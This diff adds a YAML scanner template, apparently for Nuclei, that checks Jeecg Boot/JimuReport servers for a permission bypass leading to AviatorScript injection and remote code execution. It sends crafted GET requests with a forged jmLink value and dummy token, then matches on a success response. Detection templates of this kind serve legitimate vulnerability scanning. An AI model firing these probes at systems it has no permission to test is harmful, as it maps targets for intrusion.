@@ -1,0 +1,32 @@
+id: jeecg-boot-aviatorscript-rce
+
+info:
+  name: Jeecg Boot AviatorScript - Remote Code Execution
+  author: qwtd
+  severity: critical
+  description: |-
+    JimuReport<1.8.0 存在权限绕过漏洞 导致 AviatorScript表达式注入造成RCE
+  reference:
+    - https://github.com/jeecgboot/JimuReport/issues/2865
+    - https://github.com/jeecgboot/JimuReport/issues/2904
+    - https://wiki.wy876.cn/#/./JeecgBoot/JeecgBoot%E7%B3%BB%E7%BB%9FAviatorScript%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
+  tags: Jeecg-Boot
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jeecg-boot/jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123"
+      - "{{BaseURL}}/jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success\":true"
+          - "code\":200"
+        part: body
+        condition: and
